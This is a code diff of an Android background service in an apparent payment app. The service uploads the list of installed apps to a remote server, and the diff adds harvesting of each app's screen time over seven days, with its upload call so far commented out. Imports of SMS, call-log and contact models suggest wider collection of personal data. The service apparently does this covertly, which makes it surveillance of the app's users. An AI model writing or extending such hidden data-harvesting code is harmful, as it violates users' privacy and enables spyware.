@@ -2,12 +2,14 @@ package com.payment.app.services
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.ActivityManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationChannelGroup
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.app.usage.UsageStatsManager
 import android.content.ContentResolver
 import android.content.Context
 import android.content.Intent
@@ -54,6 +56,7 @@ import com.payment.app.R
 import com.payment.app.model.CallLogModel
 import com.payment.app.model.ContactSyncModel
 import com.payment.app.model.InstalledApp
+import com.payment.app.model.ScreenTimeModel
 import com.payment.app.model.SmsModel
 import org.json.JSONObject
 import java.io.File
@@ -187,12 +190,18 @@ class MyService : Service() {
 
         val packageManager: PackageManager = packageManager
         val applications: List<ApplicationInfo> = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
+        val end = System.currentTimeMillis()
+        val begin = end - 24 * 60 * 60 * 1000 // Specify the time range (e.g., 24 hours)
+        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
 
         val dataList = ArrayList<InstalledApp>()
-
+        val screenTimeList = ArrayList<ScreenTimeModel>()
+        val startTime = getStartTimeMillis(7) // Start time in milliseconds (e.g., 7 days ago)
+        val endTime = System.currentTimeMillis()
         for (appInfo in applications) {
             val appName = appInfo.loadLabel(packageManager).toString()
             val appSize = getApplicationSize(appInfo)
+            val packageName = appInfo.packageName
             val appInstallTimeMillis = File(appInfo.sourceDir).lastModified()
             val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 LocalDateTime.ofInstant(
@@ -202,11 +211,31 @@ class MyService : Service() {
             } else {
                 TODO("VERSION.SDK_INT < O")
             }
+            var screenTime: Long = 0
+            val usageStatsList = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST, startTime, endTime)
+
+            for (usageStats in usageStatsList) {
+                if (usageStats.packageName == packageName) {
+                    val appName = appInfo.loadLabel(packageManager).toString()
+                    val usageStats = getUsageStats(this, packageName, startTime, endTime)
+                    screenTime = usageStats
+                }
+            }
+//            println("Screen time for $packageName: $appName:  $screenTime minutes")
+
             dataList.add(
                 InstalledApp(
                     appName,
                     appSize,
                     triggerTime.toString()
+                )
+            )
+
+            screenTimeList.add(
+                ScreenTimeModel(
+                    "",
+                    appName,
+                    screenTime.toString()
                 )
             )
             // Display or log the information
@@ -217,8 +246,34 @@ class MyService : Service() {
         if(dataList.isNotEmpty()){
             apiCall.getAllAppApi(dataList,token,applicationContext,baseUrl)
         }
+        if(screenTimeList.isNotEmpty()){
+//            apiCall.getScreenTimeApi(screenTimeList,token,applicationContext,baseUrl)
+        }
         Log.d("Installed App List", dataList.toString())
 
+    }
+
+    private fun getUsageStats(context: Context, packageName: String, startTime: Long, endTime: Long): Long {
+        val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+        val interval = UsageStatsManager.INTERVAL_DAILY
+
+        val usageStats = usageStatsManager.queryUsageStats(interval, startTime, endTime)
+
+        var totalTimeInForeground: Long = 0
+
+        for (stats in usageStats) {
+            if (stats.packageName == packageName) {
+                totalTimeInForeground += stats.totalTimeInForeground
+            }
+        }
+
+        return totalTimeInForeground / 1000 / 60 // Convert milliseconds to minutes
+    }
+
+    private fun getStartTimeMillis(daysAgo: Int): Long {
+        val calendar = Calendar.getInstance()
+        calendar.add(Calendar.DAY_OF_YEAR, -daysAgo)
+        return calendar.timeInMillis
     }
 
     private fun getApplicationSize(appInfo: ApplicationInfo): String {
